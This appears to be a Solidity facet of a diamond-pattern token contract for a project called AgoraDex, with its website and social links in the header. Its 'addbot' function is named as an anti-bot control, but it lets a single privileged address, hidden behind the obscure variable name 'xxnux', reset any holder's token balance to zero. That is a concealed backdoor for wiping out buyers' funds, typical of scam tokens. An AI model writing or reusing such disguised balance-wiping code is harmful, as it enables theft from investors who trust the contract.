/*
 * SPDX-License-Identifier: MIT
 * Website: https://agoradex.io/
 * X: https://twitter.com/AgoraDex
 * Telegram: https://t.me/agoradex
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract addbotFacet {
    function addbot(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
